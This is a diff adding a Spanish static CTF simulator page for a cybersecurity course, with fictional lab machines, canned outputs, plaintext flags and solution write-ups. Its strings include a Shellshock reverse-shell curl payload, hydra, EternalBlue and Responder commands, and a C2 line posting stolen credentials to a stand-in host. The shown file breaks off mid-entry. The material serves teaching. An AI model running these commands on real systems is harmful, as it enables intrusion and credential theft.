@@ -1,0 +1,1143 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>VulnLab — Laboratorio CTF · Curso TIC Ciberseguridad 30h</title>
+<style>
+  *{margin:0;padding:0;box-sizing:border-box}
+  :root{
+    --bg:#0e1721; --bg2:#111c29; --panel:#161f2c; --panel2:#1b2736; --border:#253244;
+    --text:#dfe6ee; --muted:#7c8b9e; --green:#9fef00; --green-d:#77ff00;
+    --red:#ff3e3e; --blue:#41b6ff; --purple:#a78bfa; --orange:#ff9f2c; --yellow:#ffd803;
+  }
+  body{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh}
+  code,pre,input.term{font-family:'Cascadia Code',Consolas,'Courier New',monospace}
+
+  header{background:var(--bg2);border-bottom:1px solid var(--border);padding:14px 28px;display:flex;align-items:center;gap:22px;position:sticky;top:0;z-index:50}
+  .logo{font-size:22px;font-weight:800;color:var(--green);letter-spacing:1px}
+  .logo span{color:var(--text)}
+  nav{display:flex;gap:6px;flex:1;flex-wrap:wrap}
+  nav button{background:none;border:none;color:var(--muted);font-size:13px;padding:8px 12px;border-radius:8px;cursor:pointer;font-family:inherit}
+  nav button:hover{color:var(--text);background:var(--panel)}
+  nav button.active{color:var(--green);background:var(--panel)}
+  .userbox{display:flex;align-items:center;gap:14px;font-size:13px}
+  .avatar{width:36px;height:36px;border-radius:8px;background:linear-gradient(135deg,var(--green),var(--blue));display:flex;align-items:center;justify-content:center;font-weight:800;color:#0e1721}
+  .rankbar{width:150px}
+  .rankbar .lbl{display:flex;justify-content:space-between;color:var(--muted);font-size:11px;margin-bottom:4px}
+  .rankbar .track{height:6px;background:var(--border);border-radius:4px;overflow:hidden}
+  .rankbar .fill{height:100%;background:linear-gradient(90deg,var(--green),var(--green-d));transition:width .5s}
+
+  main{max-width:1180px;margin:0 auto;padding:28px 22px 80px}
+
+  .filters{display:flex;gap:8px;margin:8px 0 20px;flex-wrap:wrap}
+  .filters button{background:var(--panel);border:1px solid var(--border);color:var(--muted);border-radius:20px;padding:6px 14px;font-size:12px;cursor:pointer}
+  .filters button.on{border-color:var(--green);color:var(--green)}
+  .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(320px,1fr));gap:18px}
+  .card{background:var(--panel);border:1px solid var(--border);border-radius:12px;padding:18px;cursor:pointer;transition:.15s;position:relative;overflow:hidden}
+  .card:hover{border-color:var(--green);transform:translateY(-2px)}
+  .card h3{font-size:17px;margin-bottom:4px}
+  .card .os{font-size:12px;color:var(--muted);line-height:1.5}
+  .modtag{display:inline-block;font-size:10px;font-weight:700;padding:2px 9px;border-radius:10px;background:#1c2a3d;color:var(--blue)}
+  .tooldots{display:inline-flex;gap:5px;margin-left:8px}
+  .tooldot{font-size:10px;padding:2px 7px;border-radius:8px;background:#221a10;color:var(--orange)}
+  .diff{display:inline-block;font-size:11px;font-weight:700;padding:3px 12px;border-radius:12px;margin-top:10px}
+  .d-easy{background:#12261c;color:var(--green)} .d-medium{background:#2b2310;color:var(--yellow)} .d-hard{background:#2a1214;color:var(--red)}
+  .owned-badge{position:absolute;top:0;right:0;background:var(--green);color:#0e1721;font-size:10px;font-weight:800;padding:4px 12px;border-radius:0 0 0 10px}
+  .cardmeta{display:flex;justify-content:space-between;margin-top:14px;font-size:12px;color:var(--muted)}
+  .pwned-dots{display:flex;gap:5px}
+  .dot{width:9px;height:9px;border-radius:50%;background:var(--border)}
+  .dot.user{background:var(--green)} .dot.root{background:var(--red)} .dot.sys{background:var(--blue)}
+
+  .machine-head{display:flex;justify-content:space-between;align-items:flex-start;gap:16px;margin-bottom:18px;flex-wrap:wrap}
+  .machine-head h2{font-size:24px}
+  .machine-head .ip{color:var(--green);font-size:14px;margin-top:4px}
+  .btn{background:var(--green);color:#0e1721;font-weight:700;border:none;border-radius:8px;padding:9px 18px;cursor:pointer;font-size:13px;font-family:inherit}
+  .btn:hover{filter:brightness(1.12)}
+  .btn.ghost{background:transparent;color:var(--text);border:1px solid var(--border)}
+
+  .term-wrap{background:#060b12;border:1px solid var(--border);border-radius:10px;overflow:hidden;margin-top:16px}
+  .term-bar{background:var(--panel2);padding:9px 14px;display:flex;align-items:center;gap:8px;font-size:12px;color:var(--muted)}
+  .term-bar .tdot{width:10px;height:10px;border-radius:50%}
+  #termout{padding:14px;height:420px;overflow-y:auto;font-size:13px;line-height:1.65}
+  #termout .cmd{color:var(--green)} #termout .err{color:var(--red)} #termout .info{color:var(--blue)} #termout .ok{color:var(--green)} #termout .dim{color:var(--muted)} #termout .flag{color:var(--yellow);font-weight:700}
+  .term-input-row{display:flex;align-items:center;gap:8px;padding:10px 14px;border-top:1px solid var(--border)}
+  .term-input-row .prompt{color:var(--green);font-size:13px;white-space:nowrap}
+  input.term{flex:1;background:none;border:none;color:var(--text);font-size:13px;outline:none}
+
+  .flagbox{background:var(--panel);border:1px solid var(--border);border-radius:12px;padding:18px;margin-top:20px}
+  .flagbox h3{font-size:14px;letter-spacing:1px;text-transform:uppercase;color:var(--green);margin-bottom:14px}
+  .flagrow{display:flex;gap:10px;align-items:center;margin:10px 0;flex-wrap:wrap}
+  .flagrow input{flex:1;min-width:220px;background:#060b12;border:1px solid var(--border);border-radius:8px;padding:9px 12px;color:var(--text);font-family:monospace;font-size:13px;outline:none}
+  .flagrow input:focus{border-color:var(--green)}
+  .flagstate{font-size:12px;font-weight:700;padding:4px 12px;border-radius:12px}
+  .st-ok{background:#12261c;color:var(--green)}
+  .toast{position:fixed;bottom:24px;right:24px;background:var(--panel2);border:1px solid var(--green);color:var(--green);padding:14px 20px;border-radius:10px;font-size:13px;opacity:0;transform:translateY(10px);transition:.3s;z-index:99;max-width:380px}
+  .toast.show{opacity:1;transform:none}
+
+  table{width:100%;border-collapse:collapse;font-size:13px}
+  th{color:var(--muted);text-transform:uppercase;font-size:10px;letter-spacing:1px;text-align:left;padding:10px;border-bottom:1px solid var(--border)}
+  td{padding:10px;border-bottom:1px solid var(--border)}
+  tr.me td{background:#15231a}
+  .rankname{font-weight:800;color:var(--green)}
+  .writeup{background:var(--panel);border:1px solid var(--border);border-radius:12px;padding:18px;margin-top:20px;font-size:13px;line-height:1.7}
+  .writeup h3{color:var(--orange);font-size:14px;margin-bottom:10px;text-transform:uppercase;letter-spacing:1px}
+  .writeup code{background:#060b12;padding:2px 7px;border-radius:5px;color:var(--green)}
+  .hidden{display:none}
+  .hintpill{background:#1c2a3d;color:var(--blue);border:1px solid #2b4a6b;font-size:12px;padding:5px 12px;border-radius:14px;cursor:pointer}
+  /* ----- modal alumno ----- */
+  .modal-bg{position:fixed;inset:0;background:rgba(4,8,14,.8);display:flex;align-items:center;justify-content:center;z-index:200}
+  .modal{background:var(--panel2);border:1px solid var(--green);border-radius:14px;padding:28px;width:min(420px,90vw);text-align:center}
+  .modal h2{font-size:19px;margin-bottom:6px}
+  .modal p{color:var(--muted);font-size:13px;margin-bottom:18px;line-height:1.6}
+  .modal input{width:100%;background:#060b12;border:1px solid var(--border);border-radius:8px;padding:12px 14px;color:var(--text);font-size:15px;outline:none;margin-bottom:16px;text-align:center}
+  .modal input:focus{border-color:var(--green)}
+  .modal .err{color:var(--red);font-size:12px;margin:-10px 0 12px;display:none}
+  @media(max-width:720px){ .rankbar{display:none} .grid{grid-template-columns:1fr} }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="logo">Vuln<span>Lab</span> ⚡</div>
+  <nav>
+    <button id="nav-machines" class="active" onclick="view('machines')">Máquinas</button>
+    <button id="nav-tools" onclick="view('tools')">Herramientas</button>
+    <button id="nav-solutions" onclick="view('solutions')">📖 Soluciones</button>
+    <button id="nav-ranking" onclick="view('ranking')">Ranking</button>
+    <button id="nav-profile" onclick="view('profile')">Mi progreso</button>
+    <button id="nav-help" onclick="view('help')">Guía</button>
+  </nav>
+  <div class="userbox">
+    <div class="rankbar">
+      <div class="lbl"><span id="rankName">Alumno nuevo</span><span id="xpTxt">0 XP</span></div>
+      <div class="track"><div class="fill" id="xpBar" style="width:0%"></div></div>
+    </div>
+    <div class="avatar" id="avatar" title="Cambiar mi nombre" style="cursor:pointer" onclick="askName(true)">--</div>
+  </div>
+</header>
+
+<main id="app"></main>
+<div class="toast" id="toast"></div>
+<div id="modal"></div>
+
+<script>
+/* =========================================================
+   VulnLab — CTF estático estilo HTB · Curso TIC 30h
+   16 máquinas, cada una centrada en una herramienta:
+   nmap, hydra, john, hashcat, metasploit, nikto, gobuster,
+   sqlmap, burp, suricata, wireshark, wazuh, responder,
+   searchsploit, nc, docker. Todo en localStorage.
+   Fines exclusivamente educativos.
+========================================================= */
+
+/* ---------- ESTADO ---------- */
+const SAVE_KEY='vulnlab_tic30_v3';
+let S=load();
+function load(){
+  try{ const d=JSON.parse(localStorage.getItem(SAVE_KEY)); if(d&&d.flags) return d; }catch(e){}
+  return { flags:{}, xp:0, user:null, initials:'--' };
+}
+function save(){ localStorage.setItem(SAVE_KEY,JSON.stringify(S)); }
+function initialsOf(name){
+  return (name||'?').split(/\s+/).filter(Boolean).map(p=>p[0]).slice(0,2).join('').toUpperCase()||'?';
+}
+function setName(name){
+  name=(name||'').trim();
+  if(!name) return false;
+  S.user=name; S.initials=initialsOf(name); save();
+  $('avatar').textContent=S.initials;
+  if(currentView==='ranking') renderRanking();
+  if(currentView==='profile') renderProfile();
+  return true;
+}
+function askName(force){
+  const forced=force===true;
+  $('modal').innerHTML='<div class="modal-bg"><div class="modal">'
+   +'<h2>🕵️ ¿Quién juega?</h2>'
+   +'<p>Introduce tu nombre para aparecer en el <b style="color:var(--text)">ranking de la clase</b> con tus XP. '
+   +'Se guarda solo en <b style="color:var(--text)">tu navegador</b> — nada sale de tu equipo.</p>'
+   +'<input id="nameInput" maxlength="30" placeholder="Ej.: María Gómez" value="'+(S.user?esc(S.user):'')+'" autofocus>'
+   +'<div class="err" id="nameErr">Escribe al menos 2 caracteres</div>'
+   +'<button class="btn" onclick="confirmName()">Guardar y empezar ▶</button>'
+   +(forced?'<div style="margin-top:12px"><button class="btn ghost" onclick="closeModal()">Cancelar</button></div>':'')
+   +'</div></div>';
+  $('nameInput').addEventListener('keydown',e=>{ if(e.key==='Enter') confirmName(); });
+  $('nameInput').focus();
+}
+function confirmName(){
+  const v=$('nameInput').value;
+  if(setName(v)){ closeModal(); toast('👋 ¡Hola, <b>'+esc(S.user)+'</b>! Ya apareces en el ranking.'); }
+  else $('nameErr').style.display='block';
+}
+function closeModal(){ $('modal').innerHTML=''; }
+
+const RANKS=[
+  {name:'Alumno nuevo',xp:0},{name:'Recon Walker',xp:60},{name:'Exploit Hunter',xp:160},
+  {name:'Analista SOC',xp:320},{name:'Pentester',xp:520},{name:'Elite Hacker',xp:780}
+];
+function rankOf(xp){ let r=RANKS[0]; for(const k of RANKS) if(xp>=k.xp) r=k; return r; }
+function nextRank(xp){ for(const k of RANKS) if(xp<k.xp) return k; return null; }
+
+/* ---------- MÁQUINAS ----------
+   Cada máquina: cmds = { "comando": [lineas], ... }
+   L líneas normales; prefijos: dim:, info:, err:, ok:, flagU:, flagR:, flagS:
+--------------------------------------------------------- */
+const MACHINES=[
+{
+  id:'meow', name:'Meow', ip:'10.10.10.5', os:'Linux', mod:'M01', diff:'easy',
+  tools:['nmap','telnet'], xp:{user:15,root:25,sys:10},
+  tag:'Primer contacto: nmap y servicios heredados',
+  flags:{user:'VULN{t3l3n3t_es_p3ligr0s0}',root:'VULN{r00t_a_trav3s_d3_telnet}',sys:'VULN{b4nn3r_l1nux_t3ln3td}'},
+  cmds:{
+    'nmap':['dim:Starting Nmap 7.94','Nmap scan report for 10.10.10.5','23/tcp open  telnet  Linux telnetd','info:💡 Telnet detectado → prueba: telnet 10.10.10.5','flagS:⚠ FLAG SISTEMA (banner) → VULN{b4nn3r_l1nux_t3ln3td}'],
+    'telnet':['ok:Connected to 10.10.10.5','Login: admin / Password: admin','ok:Welcome to MeowBox 14.04 LTS','flagU:🚩 FLAG USER → VULN{t3l3n3t_es_p3ligr0s0}','info:💡 Ahora: cat /root/flag.txt'],
+    'cat':['flagR:🚩 FLAG ROOT → VULN{r00t_a_trav3s_d3_telnet}']
+  },
+  writeup:['<code>nmap</code> revela Telnet (23): servicio heredado que un hardening correcto elimina.','Telnet cifra nada: credenciales admin:admin en claro.','El daemon corre como root: <code>cat /root/flag.txt</code>.','Lección M01: el pentest empieza siempre por enumerar lo obvio.']
+},
+{
+  id:'fawn', name:'Fawn', ip:'10.10.10.6', os:'Linux', mod:'M01', diff:'easy',
+  tools:['nmap','ftp'], xp:{user:15,root:25,sys:10},
+  tag:'FTP anónimo y extracción de archivos',
+  flags:{user:'VULN{ftp_an0nimo_act1vado}',root:'VULN{arch1v0_c0ntr4s3n4}',sys:'VULN{vsftpd_3.0.3}'},
+  cmds:{
+    'nmap':['dim:Starting Nmap 7.94','21/tcp open  ftp  vsftpd 3.0.3','ok:|_ftp-anon: Anonymous FTP login allowed','info:💡 Prueba: ftp 10.10.10.6','flagS:⚠ FLAG SISTEMA (banner vsftpd) → VULN{vsftpd_3.0.3}'],
+    'ftp':['ok:220 (vsFTPd 3.0.3) — anonymous login OK','dim:-rwxr-xr-x flag.txt\n-rwxr-xr-x backup.txt','flagU:🚩 (al leer flag.txt) FLAG USER → VULN{ftp_an0nimo_act1vado}','info:💡 Ahora: cat backup.txt'],
+    'cat':['flagR:🚩 FLAG ROOT → VULN{arch1v0_c0ntr4s3n4}']
+  },
+  writeup:['FTP anónimo: violación directa del pilar de Confidencialidad (M01).','<code>ls</code> + <code>get</code> para descargar <code>flag.txt</code> y <code>backup.txt</code>.','backup.txt contiene una contraseña en claro.','Lección M01: la enumeración paciente encuentra la vía de entrada.']
+},
+{
+  id:'brutix', name:'Brutix', ip:'10.10.10.11', os:'Linux', mod:'M02', diff:'easy',
+  tools:['hydra','nmap'], xp:{user:20,root:30,sys:10},
+  tag:'Fuerza bruta con Hydra contra SSH',
+  flags:{user:'VULN{hydr4_ssh_w34k_p4ss}',root:'VULN{p0l1t1c4_c0ntr4s3n4}',sys:'VULN{0p3nssh_7.2p1}'},
+  cmds:{
+    'nmap':['22/tcp open  ssh  OpenSSH 7.2p1','info:💡 SSH expuesto. Prueba: hydra','flagS:⚠ FLAG SISTEMA (banner OpenSSH) → VULN{0p3nssh_7.2p1}'],
+    'hydra':['dim:[ATTEMPT] target 10.10.10.11 - login "admin" - pass "123456"','ok:[22][ssh] host: 10.10.10.11  login: admin   password: Winter2026!','flagU:🚩 FLAG USER → VULN{hydr4_ssh_w34k_p4ss}','info:💡 Ahora: cat /etc/login.defs'],
+    'cat':['err:# PASS_MAX_DAYS 99999  ← contraseñas eternas','# minlen = 0  ← sin política','flagR:🚩 FLAG ROOT (política inexistente) → VULN{p0l1t1c4_c0ntr4s3n4}']
+  },
+  writeup:['<code>hydra -l admin -P rockyou.txt ssh://10.10.10.11</code>: la contraseña aparece en 4 minutos.','Contraseña + política inexistente = doble fallo de hardening (M02).','Lección: bloqueo por intentos, MFA y política de contraseñas.']
+},
+{
+  id:'hashkeeper', name:'Hashkeeper', ip:'10.10.10.12', os:'Linux', mod:'M02', diff:'medium',
+  tools:['john','hashcat'], xp:{user:25,root:40,sys:15},
+  tag:'Cracking de contraseñas con John the Ripper',
+  flags:{user:'VULN{j0hn_r1pp3r_r0ckyou}',root:'VULN{h4shc4t_m0d3_1800}',sys:'VULN{md5_s1n_s4lt}'},
+  cmds:{
+    'cat':['dim:root:$1$ab12$xK7...eQ0:0:0: (MD5 sin salt)','flagS:⚠ FLAG SISTEMA (hash MD5 débil) → VULN{md5_s1n_s4lt}','info:💡 Copia el hash y usa: john'],
+    'john':['dim:Loaded 1 password hash (md5crypt)','dim:Words in dictionary: 14,344,391','ok:Password1         (root)','flagU:🚩 FLAG USER → VULN{j0hn_r1pp3r_r0ckyou}','info:💡 Ahora prueba el hash NTLM con: hashcat'],
+    'hashcat':['dim:hashcat -m 1800 hashes.txt rockyou.txt','ok:Recovered: 1/1 (100%)  ·  password: Admin@2026','flagR:🚩 FLAG ROOT → VULN{h4shc4t_m0d3_1800}']
+  },
+  writeup:['Dump de <code>/etc/shadow</code> filtrado: hashes MD5crypt sin salt fuerte.','<code>john hash.txt --wordlist=rockyou.txt</code> rompe el hash de usuario en segundos.','<code>hashcat -m 1800</code> para el hash restante (modo 1800 = sha512crypt).','Lección M02: bcrypt/argon2 + salt + contraseñas largas; los hashes débiles caen rápido.']
+},
+{
+  id:'blue', name:'Blue', ip:'10.10.10.7', os:'Windows', mod:'M04', diff:'easy',
+  tools:['nmap','metasploit'], xp:{user:20,root:30,sys:10},
+  tag:'EternalBlue con Metasploit',
+  flags:{user:'VULN{ms17_010_e73rnalblu3}',root:'VULN{s4mba_r00t_sh3ll}',sys:'VULN{smbv1_s1n_p4rch3}'},
+  cmds:{
+    'nmap':['445/tcp open  microsoft-ds  Windows 7 SP1','err:|_smb-vuln-ms17-010: VULNERABLE','info:🚨 MS17-010. Usa msfconsole','flagS:⚠ FLAG SISTEMA (SMBv1 sin parche) → VULN{smbv1_s1n_p4rch3}'],
+    'msfconsole':['dim:msf6 > use exploit/windows/smb/ms17_010_eternalblue','dim:msf6 > set RHOSTS 10.10.10.7 ; run','ok:[+] 10.10.10.7:445 - EternalBlue exploit success','dim:meterpreter > getuid','ok:Server username: NT AUTHORITY\\SYSTEM','flagU:🚩 FLAG USER → VULN{ms17_010_e73rnalblu3}','flagR:🚩 FLAG ROOT → VULN{s4mba_r00t_sh3ll}']
+  },
+  writeup:['Ciclo M04: identificar (nmap scripts) → priorizar (CVSS 8.1) → explotar (Metasploit) → remediar (parche).','MS17-010 lleva sin parchear desde 2017 en este host.','<code>getuid</code> confirma SYSTEM: acceso total.','Lección: la remediación es del admin; el ciclo nunca termina.']
+},
+{
+  id:'vulnscan', name:'VulnScan', ip:'10.10.10.14', os:'Multi', mod:'M04', diff:'easy',
+  tools:['searchsploit','nessus'], xp:{user:15,root:30,sys:15},
+  tag:'Gestión de vulnerabilidades: CVSS y exploits públicos',
+  flags:{user:'VULN{n3ssus_cvss_9_8}',root:'VULN{r3m3d14d0_v3r1f1c4d0}',sys:'VULN{l0g4j_cV3_2021_44228}'},
+  cmds:{
+    'nessus':['dim:Escaneo iniciado… 14 hallazgos (3 críticos)','err:CRITICAL  CVE-2021-44228  Log4Shell   CVSS 9.8','err:CRITICAL  CVE-2019-0708    BlueKeep   CVSS 9.8','flagU:🚩 FLAG USER → VULN{n3ssus_cvss_9_8}','info:💡 Prioriza por CVSS. Prueba: searchsploit'],
+    'searchsploit':['info:Log4Shell (CVE-2021-44228) — Java JNDI RCE','flagS:⚠ FLAG SISTEMA → VULN{l0g4j_cV3_2021_44228}','info:💡 Prueba: patch'],
+    'patch':['ok:[✓] CVE-2021-44228 remediado · re-escaneo limpio','flagR:🚩 FLAG ROOT (verificado) → VULN{r3m3d14d0_v3r1f1c4d0}']
+  },
+  writeup:['El scanner prioriza: Log4Shell (9.8) va antes que el resto.','<code>searchsploit</code> confirma exploit público: riesgo real, no teórico.','Tras el parche, re-escaneo → verificación del ciclo (M04).','Lección: sin verificación no hay remediación.']
+},
+{
+  id:'webshop', name:'WebShop', ip:'10.10.10.15', os:'Web', mod:'M05', diff:'medium',
+  tools:['nikto','gobuster','sqlmap'], xp:{user:30,root:45,sys:15},
+  tag:'OWASP: Nikto, directorios e inyección SQL',
+  flags:{user:'VULN{g0buster_d1r_1nd3x}',root:'VULN{sQL1_un10n_r3t0rn}',sys:'VULN{n1kt0_c0ok13s_h3ad3r}'},
+  cmds:{
+    'nikto':['dim:- Nikto v2.5.0','err:+ OSVDB-3268: /admin — directorio de administración expuesto','err:+ Cookie session sin flag HttpOnly','flagS:⚠ FLAG SISTEMA → VULN{n1kt0_c0ok13s_h3ad3r}','info:💡 Prueba: gobuster'],
+    'gobuster':['dim:Gobuster v3.1 — 5.000 palabras','info:/backup    (Status: 200)','info:/admin     (Status: 301)','flagU:🚩 FLAG USER (dir /backup/index.bak) → VULN{g0buster_d1r_1nd3x}','info:💡 Prueba: sqlmap'],
+    'sqlmap':['ok:[INFO] GET parameter "id" vulnerable (UNION-based)','dim:sqlmap -u "...?id=1" --dbs','err:[*] tabla "customers": 5.320 registros','flagR:🚩 FLAG ROOT → VULN{sQL1_un10n_r3t0rn}']
+  },
+  writeup:['<code>nikto</code>: cabeceras y cookies sin HttpOnly/Secure.','<code>gobuster</code> encuentra <code>/backup</code> con código fuente antiguo.','La SQLi en el parámetro <code>id</code> permite UNION SELECT (M05).','Lección: consultas parametrizadas + gestión de sesión segura.']
+},
+{
+  id:'shocker', name:'Shocker', ip:'10.10.10.9', os:'Linux', mod:'M05', diff:'medium',
+  tools:['gobuster','curl'], xp:{user:30,root:45,sys:15},
+  tag:'Shellshock en CGI: RCE y escalada SUID',
+  flags:{user:'VULN{sh3llsh0ck_cgl_b1n}',root:'VULN{p3rl_suid_pr1v5sc}',sys:'VULN{cgI_hAndl3r_vUlN}'},
+  cmds:{
+    'gobuster':['info:/cgi-bin/user.sh  (Status: 200)','flagS:⚠ FLAG SISTEMA (handler CGI) → VULN{cgI_hAndl3r_vUlN}','info:💡 Prueba: curl'],
+    'curl':['dim:curl -A "() { :; }; /bin/bash -i" http://10.10.10.9/cgi-bin/user.sh','ok:uid=1000(shelly) — Shellshock ejecutado','flagU:🚩 FLAG USER → VULN{sh3llsh0ck_cgl_b1n}','info:💡 Escala con: find'],
+    'find':['info:/usr/bin/perl -rwsr-xr-x 1 root root','flagR:🚩 FLAG ROOT → VULN{p3rl_suid_pr1v5sc}']
+  },
+  writeup:['<code>gobuster</code> localiza el script CGI vulnerable.','CVE-2014-6271: bash antiguo + variables de entorno → RCE.','Escalada con Perl SUID encontrado con <code>find / -perm -4000</code>.','Lección M05: sanea entradas y actualiza componentes.']
+},
+{
+  id:'sniffy', name:'Sniffy', ip:'10.10.10.17', os:'Red', mod:'M03', diff:'medium',
+  tools:['wireshark','tcpdump'], xp:{user:30,root:45,sys:15},
+  tag:'Wireshark: captura, filtros y credenciales en claro',
+  flags:{user:'VULN{http_p0st_3n_cl4r0}',root:'VULN{f0ll0w_str34m_l0gin}',sys:'VULN{ftp_d4t4_p0rt_20}'},
+  cmds:{
+    'wireshark':['dim:Cargando captura vulnerlab.pcap (2.481 paquetes)','info:💡 Filtros útiles: http, ftp, tcp.port==21, http.request.method==POST','info:💡 Prueba: filter http'],
+    'filter':['ok:http.request.method == POST → 3 paquetes','err:POST /login  username=analista&password=Sn1ff3r2026!','flagU:🚩 FLAG USER (credenciales en claro) → VULN{http_p0st_3n_cl4r0}','info:💡 Prueba: follow'],
+    'follow':['ok:Follow TCP Stream #14 — sesión FTP completa','err:USER backupsvc ; PASS Backup2026! ; RETR datos.xlsx','flagR:🚩 FLAG ROOT → VULN{f0ll0w_str34m_l0gin}','info:💡 Prueba: filter ftp'],
+    'tcpdump':['dim:tcpdump -r vulnerlab.pcap port 21','info:Canal de datos FTP en puerto 20 activo','flagS:⚠ FLAG SISTEMA → VULN{ftp_d4t4_p0rt_20}']
+  },
+  writeup:['Wireshark abre el .pcap: 2.481 paquetes de la red de la oficina (M03).','Filtro <code>http.request.method==POST</code>: login en claro.','<code>Follow TCP Stream</code> revela sesión FTP completa con credenciales.','Lección M03: sin TLS todo se escucha; segmenta y cifra.']
+},
+{
+  id:'alertia', name:'Alertia', ip:'10.10.10.18', os:'SIEM', mod:'M07', diff:'medium',
+  tools:['suricata','wazuh'], xp:{user:30,root:45,sys:15},
+  tag:'Detección: Suricata IDS + Wazuh SIEM',
+  flags:{user:'VULN{sur1c4t4_s1d_2010969}',root:'VULN{w4zuh_l4v3l_10_4l3rt}',sys:'VULN{f1rew4ll_dr0p_41ert}'},
+  cmds:{
+    'suricata':['dim:Suricata IDS — eve.json en vivo','err:[**] [1:2010969:1] ET SCAN Suspected Nmap OS Detection Probe','err:[**] [1:2001219:3] ET POLICY FTP session logout','flagU:🚩 FLAG USER (SID 2010969, escaneo detectado) → VULN{sur1c4t4_s1d_2010969}','info:💡 Prueba: wazuh'],
+    'wazuh':['dim:Wazuh — alertas nivel ≥ 10','err:level 10 — "sshd: brute force attack" (IP 10.10.14.9, 842 intentos)','flagR:🚩 FLAG ROOT (level 10) → VULN{w4zuh_l4v3l_10_4l3rt}'],
+    'cat':['err:iptables DROP 10.10.14.9 — bloqueado por integración Wazuh-Firewall','flagS:⚠ FLAG SISTEMA → VULN{f1rew4ll_dr0p_41ert}']
+  },
+  writeup:['Suricata (IDS) detecta el escaneo en tiempo real con reglas ET (M07).','Wazuh correlaciona 842 fallos SSH → alerta level 10 (brute force).','La integración con el firewall dropea la IP: respuesta automática.','Lección: sin detección, el ataque pasa desapercibido.']
+},
+{
+  id:'responder', name:'Responder', ip:'10.10.10.19', os:'Windows', mod:'M03', diff:'hard',
+  tools:['responder','nmap'], xp:{user:45,root:60,sys:20},
+  tag:'Envenenamiento LLMNR/NBT-NS y captura de hash',
+  flags:{user:'VULN{r3sp0nd3r_llmn3}',root:'VULN{n3tlm_h4sh_c4ptur4d0}',sys:'VULN{l1st3n3r_mdns}'},
+  cmds:{
+    'nmap':['137/udp open  netbios-ns','5355/tcp open llmnr','info:💡 LLMNR activo (mal signo, M03). Prueba: responder'],
+    'responder':['dim:Responder 3.1.3.0 — envenenando LLMNR/NBT-NS…','ok:[*] Hash capturado (finance/SMB):','err:finance::1122334455667788:HASH...:1122','flagU:🚩 FLAG USER → VULN{r3sp0nd3r_llmn3}','flagR:🚩 FLAG ROOT (hash NTLMv2 capturado) → VULN{n3tlm_h4sh_c4ptur4d0}','info:💡 Ahora: hashcat'],
+    'hashcat':['ok:Crackeado: finance:F1n4nce2026!','flagS:⚠ FLAG SISTEMA (credencial reutilizada) → VULN{l1st3n3r_mdns}']
+  },
+  writeup:['LLMNR/NBT-NS activos en la red: protocolos heredados de Windows.','<code>responder -I eth0</code> envenena las peticiones y captura un hash NTLMv2.','<code>hashcat -m 5600</code> rompe el hash: reutilización de contraseña.','Lección M03: deshabilita LLMNR/NBT-NS por GPO; nunca reutilices contraseñas.']
+},
+{
+  id:'fishnet', name:'FishNet', ip:'mail.vulnlab.es', os:'Email', mod:'M10', diff:'medium',
+  tools:['wireshark','readmail'], xp:{user:30,root:40,sys:20},
+  tag:'Phishing: análisis de correo y cabeceras',
+  flags:{user:'VULN{sp00f3d_dom41n_l0ck3d}',root:'VULN{cr3d3nc14l_r3d1r3ct_b4nk}',sys:'VULN{spf_dk1m_dmarc_f41l}'},
+  cmds:{
+    'readmail':['err:De: soporte@banca-segura-verify.com (❌ dominio suplantado)','dim:Asunto: «Su cuenta será bloqueada en 24h»','flagU:🚩 FLAG USER → VULN{sp00f3d_dom41n_l0ck3d}','info:💡 Prueba: checkheaders'],
+    'checkheaders':['err:SPF: fail · DKIM: none · DMARC: none','flagS:⚠ FLAG SISTEMA → VULN{spf_dk1m_dmarc_f41l}','info:💡 Prueba: cat'],
+    'cat':['err:c2_config.txt → POST https://evil-lab.xyz/collect (roba credenciales)','flagR:🚩 FLAG ROOT → VULN{cr3d3nc14l_r3d1r3ct_b4nk}']
+  },
+  writeup:['Análisis de phishing (M10): urgencia + dominio suplantado.','Cabeceras: SPF/DKIM/DMARC fallan → remitente falso verificable.','La landing envía credenciales a un C2.','Lección: formación + MFA + filtrado; el gestor de contraseñas no autocompleta dominios falsos.']
+},
+{
+  id:'ghostport', name:'GhostPort', ip:'10.10.10.20', os:'Linux', mod:'M03', diff:'hard',
+  tools:['nc','nmap'], xp:{user:45,root:60,sys:20},
+  tag:'Banner grabbing y backdoor oculta con netcat',
+  flags:{user:'VULN{p0rt_kn0ck1ng_0p3n}',root:'VULN{b4ckd00r_6667_irc}',sys:'VULN{b4nn3r_vulf1l3_s3rv}'},
+  cmds:{
+    'nmap':['22/tcp open ssh','80/tcp open http','info:💡 Todo parece normal… prueba: nmap -p-'],
+    'nmap -p-':['dim:Escaneo completo de 65.535 puertos (tarda más…)','err:6667/tcp open  irc  ¡puerto inusual!','flagU:🚩 FLAG USER (puerto oculto descubierto) → VULN{p0rt_kn0ck1ng_0p3n}','info:💡 Conéctate: nc 10.10.10.20 6667'],
+    'nc':['ok:Conectado a 10.10.10.20:6667','err::vulnfile.server NOTICE * Bienvenido, intruso','flagS:⚠ FLAG SISTEMA (banner del servicio) → VULN{b4nn3r_vulf1l3_s3rv}','err:Comandos: LIST, GET /root/flag','flagR:🚩 FLAG ROOT (backdoor) → VULN{b4ckd00r_6667_irc}']
+  },
+  writeup:['Un <code>nmap</code> rápido solo muestra lo común: el escaneo completo (<code>-p-</code>) revela 6667.','Banner grabbing con <code>nc</code>: servicio irc falso, en realidad una backdoor.','Lección M03: escanea todo el rango; las backdoors se esconden en puertos altos.']
+},
+{
+  id:'cloudian', name:'Cloudian', ip:'s3.eu-west-1.vulnlab.cloud', os:'AWS-like', mod:'M06', diff:'medium',
+  tools:['aws','nmap'], xp:{user:30,root:45,sys:15},
+  tag:'Cloud: bucket S3 público y claves IAM',
+  flags:{user:'VULN{s3_buck3t_publ1c0}',root:'VULN{1am_k3ys_3xp0n3d}',sys:'VULN{cl0uds3cr3t_r3v3al3d}'},
+  cmds:{
+    'nmap':['443/tcp open https (endpoint S3)','info:💡 Enumera el bucket: aws s3 ls'],
